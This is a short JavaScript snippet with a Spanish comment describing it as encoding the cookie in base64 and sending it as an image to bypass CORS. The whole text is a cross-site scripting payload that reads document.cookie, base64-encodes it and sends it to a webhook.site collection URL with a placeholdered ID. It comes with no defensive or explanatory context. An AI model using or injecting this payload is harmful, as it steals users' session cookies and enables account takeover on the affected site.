// Codifica la cookie en base64 y la envía como imagen (bypass CORS)
var x = new Image();
x.src = "https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX?data=" + btoa(document.cookie);
